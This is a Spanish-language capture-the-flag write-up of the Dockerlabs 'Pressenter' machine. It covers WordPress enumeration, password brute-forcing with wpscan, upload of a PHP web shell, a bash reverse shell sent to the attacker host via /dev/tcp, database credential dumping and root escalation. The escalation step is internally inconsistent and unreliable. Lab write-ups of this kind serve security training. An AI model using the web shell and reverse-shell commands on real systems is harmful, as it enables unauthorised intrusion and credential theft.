# Writeup Template: Maquina `[ Pressenter ]`

- Tags: #Pressenter
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Pressenter](https://mega.nz/file/aJUHFbzC#JtLW0g6ovbzOwO71ddC8wolKMIVmMkuexkW_LQI2zSE) 

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x pressenter.zip
sudo bash auto_deploy.sh pressenter.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ]) **ubuntuNoble**
---

## Enumeracion de [Servicio Web Principal] `WordPress[6.6.1]`
Revisando el codigo fuente: detectamos que se esta aplicando **hostsDiscovery** al siguiente dominio
```bash
http://pressenter.hl/
```

### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
whatweb http://pressenter.hl/ # Detectamos wordpress como gestor CMS
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
nmap --script http-enum -p 80 pressenter.hl # Este si que nos reporta rutas
```

Reporte:
```bash
/wp-login.php: Possible admin folder
/readme.html: Wordpress version: 2 
/: WordPress version: 6.6.1
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://pressenter.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 200) [Size: 58943]
/wp-admin/            (Status: 302) [Size: 0] [--> http://pressenter.hl/wp-login.php?redirect_to=http%3A%2F%2Fpressenter.hl%2Fwp-admin%2F&reauth=1]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://pressenter.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,txt,sh,html,js,zip,tar,gzip
```

- **Hallazgos**:
```bash
/index.php            (Status: 301) [Size: 0] [--> http://pressenter.hl/]
/wp-content           (Status: 301) [Size: 319] [--> http://pressenter.hl/wp-content/]
/wp-login.php         (Status: 200) [Size: 6569]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 320] [--> http://pressenter.hl/wp-includes/]
/readme.html          (Status: 200) [Size: 7409]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 317] [--> http://pressenter.hl/wp-admin/]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://pressenter.hl/wp-login.php?action=register]
```

### Enumeracion WordPress:
Realizaremos una enumeracion agresiva para este servicio:
```bash
wpscan --url http://pressenter.hl/ --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```
### Credenciales Encontradas
- Usuario: `[ pressi ]`
- Contraseña: `[ ]` # aun no sabemos la contrasena pero realizaremos un ataque de fuerza bruta:

Iniciamos el ataque:
```bash
wpscan --url http://pressenter.hl/ --passwords /usr/share/wordlists/rockyou.txt --usernames pressi
```

Resultado:
```bash
[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass
```

Ahora nos loguearemos en el siguiente panel de **wordpress**
```bash
http://pressenter.hl/wp-admin/
```

Colocamos las siguientes credenciales:
```bash
username: pressi
password: dumbass
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que estamos dentro del panel administrativo de **wordpress** tendremos que ver la forma de derivarlo a una ejecucion remota de comandos

### 🛡️ **File Manager Plugins de WordPress: Riesgos**
Los plugins de administrador de archivos (como **File Manager**, **WP File Manager**, etc.) son herramientas poderosas pero también **un vector crítico de vulnerabilidades** si no se configuran adecuadamente.
- Permiten editar/eliminar cualquier archivo del servidor (incluyendo `wp-config.php`).
- Si un atacante obtiene acceso, puede:  
    • Robar bases de datos.  
    • Instalar backdoors.  
    • Desfigurar el sitio.

Una ves instalado el **File Manager** y **Activado** Ahora subiremos un archivo malicioso en la siguiente ruta:
```bash
http://pressenter.hl/wp-content/uploads/
```

**( cmd.php )** Este sera el nombre de nuestro archivo el cual contendra la siguiente instruccion que nos permita ejecutar una llamada a nivle de sistema:
```php
<?php
  system($_GET["cmd"]);
?>
```

### Ejecucion del Ataque
Ahora tendremos la capacidad de ejecutar comandos en la maquina victica, Lo que nos permite enviarnos una **reverShell** en nuestra maquina atacante:
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://pressenter.hl/wp-content/uploads/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Tenemos el archivo de configuracion de la base de datos de **wordpress** el cual revisamos
```bash
# Comandos clave ejecutados
cat wp-config.php 
```

**Hallazgos Clave:**
- Binario con privilegios: `[ wp-config.php ]`
- Credenciales de usuario: `[ admin ]:[ rooteable ]`

ahora procedemos a conectarnos:
```bash
mysql -u admin -p # ( rooteable )
```

Una ves conectados, Enocntramos **wordpress** que es la base de datos del servidor con una tabla: 
```bash
mysql> desc wp_users;
```

Ahora enumeramos los el usuario y su contrasena:
```bash
mysql> SELECT user_login, user_pass FROM wp_users;
```

Resultado:
```bash
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| pressi     | $P$BeinDKnzoAYpx.wCePjkJeVNV5plCW. |
| hacker     | $P$BiO9aZSB4m/CMeGjq3o4PPaE4ipdIt/ |
+------------+------------------------------------+
```

Tambien tenemos **wp_usersname;** que es donde puede que esten las claes del usuario **Enter**
```bash
mysql> desc wp_usersname;
```

Listamos la informacion:
```bash
SELECT user_login, user_pass FROM wp_usernames;
```

Resultado: Tenemos las claves de acceso del usuario **Enter**
```bash
+----------+-----------------+
| username | password        |
+----------+-----------------+
| enter    | kernellinuxhack |
+----------+-----------------+
```

Ahora migraremos a este usuario: **Enter**
```bash
su enter #( kernellinuxhack )
```

### Explotacion de Privilegios

###### Usuario `[ Enter ]`:
Tenemos estos dos binarios que podemos explotar:
```bash
sudo -l

User enter may run the following commands on bd894d01f530:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
    (ALL : ALL) NOPASSWD: /usr/bin/whoami
```

Lo que aremos es crearnos una copia del **( /etc/passwd )** pero le quitaremos la **( x )** al usuario root para podernos conectar sin proporcionar contrasena. quedando esta linea asi:
```bash
root::0:0:root:/root:/bin/bash # Esto nos permite logueamos sin contrasena
```

ahora usaremos el bianrio **cat** para enviar ese contenido al archivo original para sustituirlo por el nuestro:
**Nota** No permite que modifiquemos ese archivo

```bash
# Comando para escalar al usuario: ( root )
su root # ( kernellinuxhack )
```

Ahora tenemos una shell como root

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@bd894d01f530:/home/enter# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a detectar usuarios con **wp-scan**
2. Aprendimos a realizar fuerza bruta con **wp-scan**
3. Aprendimos a subir archivos maliciosos en la maquina victima para ganar acceso al sistema.

## Recomendaciones de Seguridad
- Securizar el gestor **CMS WordPress** 